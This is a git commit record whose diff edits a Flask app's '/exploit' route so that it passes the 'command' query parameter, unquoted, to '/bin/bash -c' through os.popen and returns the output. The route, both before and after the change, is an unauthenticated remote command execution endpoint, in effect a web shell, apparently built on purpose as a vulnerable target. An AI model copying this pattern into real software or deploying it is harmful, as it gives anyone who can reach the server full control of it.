72c86c16b0b1ef948bb4c24402483fd10ec67c49
Victor Odusanya <victor.odusanya@interswitchgroup.com>
2019-11-07 12:57:29 -0800

    let exploit use bash

--- app.py
+++ app.py
@@ -9,7 +9,8 @@ def hello():
 @app.route("/exploit")
 def exploit():
     cmd = request.args.get('command')
-    return render_template_string('Shell output: {{out}}', out=str(os.popen(cmd).read()))
+    bash_cmd = "/bin/bash -c " + cmd
+    return render_template_string('Shell output: {{out}}', out=str(os.popen(bash_cmd).read()))
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 80))
